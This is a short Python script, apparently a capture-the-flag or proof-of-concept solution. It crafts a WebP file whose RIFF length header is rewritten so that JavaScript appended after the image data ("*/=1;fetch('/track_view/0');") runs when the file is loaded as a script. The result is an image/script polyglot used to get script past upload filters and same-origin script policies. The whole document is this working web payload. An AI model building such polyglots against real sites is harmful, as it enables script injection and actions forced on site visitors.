import io
from PIL import Image

width, height = 100, 100
color = (255, 0, 0)
total_desired_size = 10799 + 8

image = Image.new("RGB", (width, height), color=color)

byte_stream = io.BytesIO()
image.save(byte_stream, format="WEBP")
webp_data = byte_stream.getvalue()

if len(webp_data) < total_desired_size:
    webp_data = webp_data + b"\x00" * (total_desired_size - len(webp_data))
elif len(webp_data) > total_desired_size:
    webp_data = webp_data[:total_desired_size]

length_bytes = (10799).to_bytes(4, byteorder="little")
webp_data_fixed = b"RIFF" + length_bytes + webp_data[8:]

comment = b"*/=1;fetch('/track_view/0');"
webp_data_with_comment = webp_data_fixed + comment

with open("sample.webp", "wb") as f:
    f.write(webp_data_with_comment)
